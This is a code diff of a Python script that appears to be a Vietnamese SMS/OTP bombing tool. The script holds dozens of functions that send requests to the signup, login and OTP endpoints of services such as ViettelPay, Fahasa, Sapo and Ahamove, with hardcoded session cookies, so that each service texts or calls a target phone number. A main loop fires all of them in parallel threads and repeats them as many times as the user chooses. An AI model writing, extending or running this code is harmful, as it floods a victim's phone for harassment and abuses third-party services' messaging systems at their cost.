_ga_KCGG79N4SY=GS1.1.1691887985.1.1.1691887993.0.0.0; _ga_3PKTQRQF3P=GS1.1.1691887985.1.1.1691888009.36.0.0',
-    }
-  data = '{"phone_number":"phone","trade_code":"379760000"}'.replace('phone',phone)
-  response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data).text
-def sms41(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        "Host": "api8.viettelpay.vn",
-        "product": "VIETTELPAY",
-        "accept-language": "vi",
-        "authority-party": "APP",
-        "channel": "APP",
-        "type-os": "android",
-        "app-version": "5.1.4",
-        "os-version": "10",
-        "imei": "VTP_" + generate_random_string(32),
-        "x-request-id": "20230803164512",  # Replace with the current date and time in the format "YmdHis"
-        "content-type": "application/json; charset=UTF-8",
-        "user-agent": "okhttp/4.2.2"
-    }
-
-    data = {
-        "type": "msisdn",
-        "username": phone
-    }
-
-    response = requests.post("https://api8.viettelpay.vn/customer/v1/validate/account", json=data, headers=headers, timeout=30, verify=False)
-    get_data = response.json()
-
-    if get_data["status"]["code"] == "CS9901":
-        data = {
-            "hash": "",
-            "identityType": "msisdn",
-            "identityValue": phone,
-            "imei": "VTP_" + generate_random_string(32),
-            "notifyToken": "",
-            "otp": "android",
-            "pin": "VTP_" + generate_random_string(32),
-            "transactionId": "",
-            "type": "REGISTER",
-            "typeOs": "android",
-            "verifyMethod": "sms"
-        }
-        response = requests.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=data, headers=headers, timeout=30, verify=False)
-        get_data = response.json()
-    else:
-        data = {
-            "imei": "VTP_" + generate_random_string(32),
-            "loginType": "BASIC",
-            "msisdn": phone,
-            "otp": "",
-            "pin": "VTP_" + generate_random_string(32),
-            "requestId": "",
-            "typeOs": "android",
-            "userType": "msisdn",
-            "username": phone
-        }
-        response = requests.post("https://api8.viettelpay.vn/auth/v1/authn/login", json=data, headers=headers, timeout=30, verify=False)
-        get_data = response.json()
-
-    if "Cần xác thực bổ sung OTP" in get_data["status"]["message"] or "Vui lòng nhập mã OTP được gửi về SĐT " + phone + " để xác minh chính chủ" in get_data["status"]["message"]:
-        thanhcong+=1
-    else:
-        thatbai+=1
-def sms42(phone):
-    global thanhcong
-    global thatbai
+    response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data);hoanthanh("vietair", phone)
+def fa(phone):
     cookies = {
-        '_cfuvid': 'lDZgITpXJ8dt8dz1xxZJ2eO1jjTsLRNQz1EYGUtvHD8-1693616884672-0-604800000',
-        'con.ses.id': 'cb51616e-d90e-4d43-afff-4a8d4090aaea',
-        'cf_clearance': 'JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900',
-        '_gid': 'GA1.3.455334370.1693616897',
-        '_gat_gtag_UA_3729099_6': '1',
-        '_gat_UA-3729099-1': '1',
-        '_tt_enable_cookie': '1',
-        '_ttp': 'ECEDsVw9uB_ZcsJoOLvv1Y0mgh3',
-        '_hjFirstSeen': '1',
-        '_hjIncludedInSessionSample_1708983': '0',
-        '_hjSession_1708983': 'eyJpZCI6IjAyZmM1ODM1LTcyNmQtNGViNC1hZjcwLTQwM2RkMTQ1NmNhNyIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODgsImluU2FtcGxlIjpmYWxzZX0=',
-        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%229e211272-4290-4e80-a51d-792eb9dc3989%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037584Z%22%7D',
-        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22452b0e1f-b525-4c00-b9f0-47fb464a55fb%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037858Z%22%7D',
-        '_gcl_au': '1.1.716350485.1693616908',
-        'desapp': 'sellernet01',
-        'SERVERID': '53',
-        '_ga': 'GA1.3.177629587.1693616897',
-        '_hjSessionUser_1708983': 'eyJpZCI6IjFhYTZhNmIxLWNhNDgtNTJmNS05NmY2LTNjYTIzNzI3MzQ5MiIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODQsImV4aXN0aW5nIjp0cnVlfQ==',
-        '__zi': '2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUzlJCG47POP_mzy84HDrlqFVmpGv0sJCsE0.1',
-        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%224d8900df-674c-335e-950a-217f9fa7a2db%22%2C%22c%22%3A1693616925481%2C%22l%22%3A1693616925481%7D',
-        '_ga_HTS298453C': 'GS1.1.1693616898.1.1.1693616926.32.0.0',
-    }
+    'frontend': '2c83545216a746a78e9359eb6ed27b3d',
+    '_ga': 'GA1.1.4630769.1721136088',
+    '_gcl_au': '1.1.1971610675.1721136089',
+    'frontend_cid': 'zNYnI9BV3h9Li12T',
+    '_tt_enable_cookie': '1',
+    '_ttp': 'yK0_Sao-5lepXIRR39-6N_UcfI2',
+    '_fbp': 'fb.1.1721136099403.449285731186677163',
+    '_clck': '1n4uxir%7C2%7Cfni%7C0%7C1658',
+    'moe_uuid': '3aa3f66c-847f-4fcc-988c-f4d857f0a073',
+    'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D',
+    'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
+    'OPT_IN_SHOWN_TIME': '1721136125365',
+    'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
+    '_clsk': '169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect',
+    'SESSION': '%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D',
+    '_ga_460L9JMC2G': 'GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
+}
 
     headers = {
-        'authority': 'm.batdongsan.com.vn',
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
-        # 'cookie': '_cfuvid=lDZgITpXJ8dt8dz1xxZJ2eO1jjTsLRNQz1EYGUtvHD8-1693616884672-0-604800000; con.ses.id=cb51616e-d90e-4d43-afff-4a8d4090aaea; cf_clearance=JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900; _gid=GA1.3.455334370.1693616897; _gat_gtag_UA_3729099_6=1; _gat_UA-3729099-1=1; _tt_enable_cookie=1; _ttp=ECEDsVw9uB_ZcsJoOLvv1Y0mgh3; _hjFirstSeen=1; _hjIncludedInSessionSample_1708983=0; _hjSession_1708983=eyJpZCI6IjAyZmM1ODM1LTcyNmQtNGViNC1hZjcwLTQwM2RkMTQ1NmNhNyIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODgsImluU2FtcGxlIjpmYWxzZX0=; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%229e211272-4290-4e80-a51d-792eb9dc3989%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037584Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22452b0e1f-b525-4c00-b9f0-47fb464a55fb%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037858Z%22%7D; _gcl_au=1.1.716350485.1693616908; desapp=sellernet01; SERVERID=53; _ga=GA1.3.177629587.1693616897; _hjSessionUser_1708983=eyJpZCI6IjFhYTZhNmIxLWNhNDgtNTJmNS05NmY2LTNjYTIzNzI3MzQ5MiIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODQsImV4aXN0aW5nIjp0cnVlfQ==; __zi=2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUzlJCG47POP_mzy84HDrlqFVmpGv0sJCsE0.1; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%224d8900df-674c-335e-950a-217f9fa7a2db%22%2C%22c%22%3A1693616925481%2C%22l%22%3A1693616925481%7D; _ga_HTS298453C=GS1.1.1693616898.1.1.1693616926.32.0.0',
-        'dnt': '1',
-        'referer': 'https://m.batdongsan.com.vn/sellernet/trang-dang-ky',
-        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    }
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': 'frontend=2c83545216a746a78e9359eb6ed27b3d; _ga=GA1.1.4630769.1721136088; _gcl_au=1.1.1971610675.1721136089; frontend_cid=zNYnI9BV3h9Li12T; _tt_enable_cookie=1; _ttp=yK0_Sao-5lepXIRR39-6N_UcfI2; _fbp=fb.1.1721136099403.449285731186677163; _clck=1n4uxir%7C2%7Cfni%7C0%7C1658; moe_uuid=3aa3f66c-847f-4fcc-988c-f4d857f0a073; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1721136125365; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; _clsk=169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect; SESSION=%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D; _ga_460L9JMC2G=GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
+    'origin': 'https://www.fahasa.com',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'traceparent': '00-13c9c10c4d525aad8d0528fa3b7fd940-866a99283e198658-01',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
 
-    params = {
-        'phoneNumber': phone,
-    }
-
-    response = requests.get(
-        'https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
-        params=params,
-        cookies=cookies,
-        headers=headers,
-    )
-
-    thanhcong+=1
-def sms43(phone):
-    global thanhcong
-    global thatbai
-    headers = {
-        "Host": "id.icankid.vn",
-        "Connection": "keep-alive",
-        "Content-Length": "134",
-        "sec-ch-ua-platform": "\"Android\"",
-        "sec-ch-ua-mobile": "?1",
-        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-        "content-type": "application/json",
-        "Accept": "*/*",
-        "Origin": "https://id.icankid.vn",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Referer": "https://id.icankid.vn/auth",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
-        "Cookie": "_ga_LM3PQNHV6S=GS1.1.1683042907.1.0.1683042907.60.0.0; _gcl_au=1.1.888294803.1683042909; _ga_JLL9R732MK=GS1.1.1683042909.1.0.1683042909.0.0.0; _ga_FMXKZXNRJB=GS1.1.1683042909.1.0.1683042909.60.0.0; _hjSessionUser_3154488=eyJpZCI6IjFlZDBjZjEzLTk1NTYtNWFiYi1hNjZkLWVhYzZhMmJkYTljZCIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5NDYsImV4cCI6ZmFsc2V9; _hjFirstSeen=1; _hjIncludedInSessionSample_3154488=0; _hjSession_3154488=eyJpZCI6IjJlZmFjYjk2LWQ4NWEtNGY3NC1iYjdiLWEyMjRmNDQ5YzQ3YiIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5ODMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _gid=GA1.2.665729834.1683042910; _gat_gtag_UA_201462250_4=1; _gat_UA-222516876-1=1; _fbp=fb.1.1683042910188.410123624; _ga_T14T78MGX8=GS1.1.1683042910.1.0.1683042910.0.0.0; _ga=GA1.1.820789589.1683042908; _ga_5KHZV6MD4J=GS1.1.1683042915.1.0.1683042916.0.0.0; _ga=GA1.3.820789589.1683042908; _gid=GA1.3.665729834.1683042910; _gat_UA-213798897-3=1"
-    }
-    
     data = {
-        "phone": phone,
-        "challenge_code": "674b72a1c98013e2fb629e19236d592c466b3de750584c974bba31377c283c00",
-        "challenge_method": "SHA256"
-    }
-    response = requests.post("https://id.icankid.vn/api/otp/challenge/", json=data, headers=headers, timeout=30, verify=False)
+    'phone': phone,
+}
+
+    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data);hoanthanh("fahasa", phone)
+def sapo(phone):
+    cookies = {
+    '_hjSessionUser_3167213': 'eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==',
+    '_hjSession_3167213': 'eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
+    '_gid': 'GA1.2.312311746.1721136107',
+    '_fbp': 'fb.1.1721136112829.278874665245209803',
+    '_ce.irv': 'new',
+    'cebs': '1',
+    '_ce.clock_event': '1',
+    '_ce.clock_data': '-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
+    'G_ENABLED_IDPS': 'google',
+    'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
+    'lang': 'vi',
+    'referral': 'https://accounts.sapo.vn/',
+    'landing_page': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
+    'start_time': '07/16/2024 20:50:23',
+    '_dc_gtm_UA-66880228-3': '1',
+    'pageview': '2',
+    '_ga_4NX0F91DEX': 'GS1.2.1721136112.1.1.1721137827.0.0.0',
+    'cebsp_': '8',
+    '_dc_gtm_UA-66880228-1': '1',
+    '_gat_UA-239546923-1': '1',
+    '_ga_YNVPPJ8MZP': 'GS1.1.1721136164.1.1.1721137832.50.0.0',
+    '_ga': 'GA1.1.1203051188.1721136107',
+    '_ga_GECRBQV6JK': 'GS1.1.1721136164.1.1.1721137833.49.0.0',
+    '_ga_8956TVT2M3': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
+    '_ga_HXMGB9WRVX': 'GS1.1.1721136159.1.1.1721137833.60.0.0',
+    '_ga_CDD1S5P7D4': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
+    '_ga_Y9YZPDEGP0': 'GS1.1.1721136163.1.1.1721137833.49.0.0',
+    '_ga_EBZKH8C7MK': 'GS1.2.1721136166.1.1.1721137833.0.0.0',
+    '_ga_P9DPF3E00F': 'GS1.1.1721136112.1.1.1721137846.0.0.0',
+    '_ga_8Z6MB85ZM2': 'GS1.1.1721136165.1.1.1721137847.35.0.0',
+    '_ce.s': 'v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457',
+    '_gcl_au': '1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
+}
+
+    headers = {
+    'accept': '*/*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': '_hjSessionUser_3167213=eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3167213=eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _gid=GA1.2.312311746.1721136107; _fbp=fb.1.1721136112829.278874665245209803; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; G_ENABLED_IDPS=google; source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; lang=vi; referral=https://accounts.sapo.vn/; landing_page=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; start_time=07/16/2024 20:50:23; _dc_gtm_UA-66880228-3=1; pageview=2; _ga_4NX0F91DEX=GS1.2.1721136112.1.1.1721137827.0.0.0; cebsp_=8; _dc_gtm_UA-66880228-1=1; _gat_UA-239546923-1=1; _ga_YNVPPJ8MZP=GS1.1.1721136164.1.1.1721137832.50.0.0; _ga=GA1.1.1203051188.1721136107; _ga_GECRBQV6JK=GS1.1.1721136164.1.1.1721137833.49.0.0; _ga_8956TVT2M3=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_HXMGB9WRVX=GS1.1.1721136159.1.1.1721137833.60.0.0; _ga_CDD1S5P7D4=GS1.1.1721136165.1.1.1721137833.49.0.0; _ga_Y9YZPDEGP0=GS1.1.1721136163.1.1.1721137833.49.0.0; _ga_EBZKH8C7MK=GS1.2.1721136166.1.1.1721137833.0.0.0; _ga_P9DPF3E00F=GS1.1.1721136112.1.1.1721137846.0.0.0; _ga_8Z6MB85ZM2=GS1.1.1721136165.1.1.1721137847.35.0.0; _ce.s=v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457; _gcl_au=1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
+    'origin': 'https://www.sapo.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    data = {
+    'phonenumber': phone,
+}
+
+    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data);hoanthanh("sapo", phone)
+
+def run(phone, i):
+    functions = [
+        tv360, robot, fb, mocha, dvcd, myvt, phar, dkimu, fptshop, meta, blu,
+        tgdt, concung, money, sapo, hoang, winmart, alf, guma, kingz, acfc, phuc, medi, emart, hana,
+        med, ghn, shop, gala, fa, cathay, vina, ahamove, air, otpmu, vtpost, shine, domi, fm, cir, hoanvu, tokyo, shop, beau, fu, lote, lon
+    ]
     
-    if response.ok:
-        thanhcong+=1
-    else:
-        thatbai+=1
-def sms44(phone):
-    mail = random_string(6)
-    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
-    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"cocailondjtcmm12@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
-    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers, timeout=30, verify=False)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+        futures = [executor.submit(fn, phone) for fn in functions]
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                future.result()
+            except Exception:
+                pass  # Bỏ qua lỗi, không in gì cả
 
-import sys, re
+    delay = random.randint(6, 10)
+    for d in range(delay, 0, -1):
+        print(f"[INFO] Đang chờ {d} giây...", end='\r')
+        time.sleep(1)
 
-def run(phone):
-    print(f"Đang chạy với số {phone}")
-    sms0(phone); print("Bắt đầu sms0")
-    sms1(phone); print("Bắt đầu sms1")
-    sms2(phone); print("Bắt đầu sms2")
-    sms3(phone); print("Bắt đầu sms3")
-    sms4(phone); print("Bắt đầu sms4")
-    sms5(phone); print("Bắt đầu sms5")
-    sms7(phone); print("Bắt đầu sms7")
-    sms8(phone); print("Bắt đầu sms8")
-    sms9(phone); print("Bắt đầu sms9")
-    sms10(phone); print("Bắt đầu sms10")
-    sms11(phone); print("Bắt đầu sms11")
-    sms12(phone); print("Bắt đầu sms12")
-    sms13(phone); print("Bắt đầu sms13")
-    sms14(phone); print("Bắt đầu sms14")
-    sms15(phone); print("Bắt đầu sms15")
-    sms17(phone); print("Bắt đầu sms17")
-    sms18(phone); print("Bắt đầu sms18")
-    sms19(phone); print("Bắt đầu sms19")
-    sms20(phone); print("Bắt đầu sms20")
-    sms21(phone); print("Bắt đầu sms21")
-    sms22(phone); print("Bắt đầu sms22")
-    sms23(phone); print("Bắt đầu sms23")
-    sms24(phone); print("Bắt đầu sms24")
-    sms25(phone); print("Bắt đầu sms25")
-    sms26(phone); print("Bắt đầu sms26")
-    sms27(phone); print("Bắt đầu sms27")
-    sms28(phone); print("Bắt đầu sms28")
-    sms29(phone); print("Bắt đầu sms29")
-    sms30(phone); print("Bắt đầu sms30")
-    sms31(phone); print("Bắt đầu sms31")
-    sms32(phone); print("Bắt đầu sms32")
-    sms33(phone); print("Bắt đầu sms33")
-    sms34(phone); print("Bắt đầu sms34")
-    sms35(phone); print("Bắt đầu sms35")
-    sms36(phone); print("Bắt đầu sms36")
-    sms37(phone); print("Bắt đầu sms37")
-    sms5(phone); print("Bắt đầu sms5")
-    sms7(phone); print("Bắt đầu sms7")
-    sms8(phone); print("Bắt đầu sms8")
-    sms9(phone); print("Bắt đầu sms9")
-    sms10(phone); print("Bắt đầu sms10")
-    sms11(phone); print("Bắt đầu sms11")
-    sms12(phone); print("Bắt đầu sms12")
-    sms38(phone); print("Bắt đầu sms38")
-    sms39(phone); print("Bắt đầu sms39")
-    sms40(phone); print("Bắt đầu sms40")
-    sms41(phone); print("Bắt đầu sms41")
-    sms42(phone); print("Bắt đầu sms42")
-    sms43(phone); print("Bắt đầu sms43")
-    sms44(phone); print("Bắt đầu sms44")
-    time.sleep(1)
-    call2(phone); print("Bắt đầu call2")
-    time.sleep(5)
-    call6(phone); print("Bắt đầu call6")
-    time.sleep(5)
-    call3(phone); print("Bắt đầu call3")
-    time.sleep(5)
-    call4(phone); print("Bắt đầu call4")
-    time.sleep(5)
-    call5(phone); print("Bắt đầu call5")
-    time.sleep(5)
-    call2(phone); print("Bắt đầu call2")
-    time.sleep(5)
-    call6(phone); print("Bắt đầu call6")
-    time.sleep(5)
-    call3(phone); print("Bắt đầu call3")
-    time.sleep(5)
-    call4(phone); print("Bắt đầu call4")
-    time.sleep(5)
-    call5(phone); print("Bắt đầu call5")
-    time.sleep(5)
-    call7(phone); print("Bắt đầu call7")
+import sys
 
-import sys, re
+def main():
+    # Nhập số điện thoại
+    phone = input("Nhập số điện thoại: ").strip()
+    if not phone:
+        print("Bạn chưa nhập số điện thoại!")
+        return
 
-def run(phone):
-    print(f"Đang chạy với số {phone}")
-    # logic xử lý ở đây
+    # Nhập số lần gửi
+    try:
+        count_input = input("Nhập số lần gửi: ").strip()
+        count = int(count_input)
+    except ValueError:
+        print("Số lần phải là số nguyên!")
+        return
 
-def chay():
-    if len(sys.argv) < 2:
-        print("Vui lòng truyền số điện thoại làm tham số dòng lệnh.")
-        sys.exit(1)
-    
-    phone = sys.argv[1]
+    print("\nBắt đầu chạy...\n")
+    for i in range(1, count + 1):
+        run(phone, i)
 
-    # Kiểm tra định dạng số điện thoại
-    if not re.search(r"^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$", phone):
-        print("Số điện thoại không hợp lệ.")
-        sys.exit(1)
-    
-    run(phone)  # chạy 1 lần thôi
+    print("\nĐã hoàn tất")
 
 if __name__ == "__main__":
-    chay()
+    main()
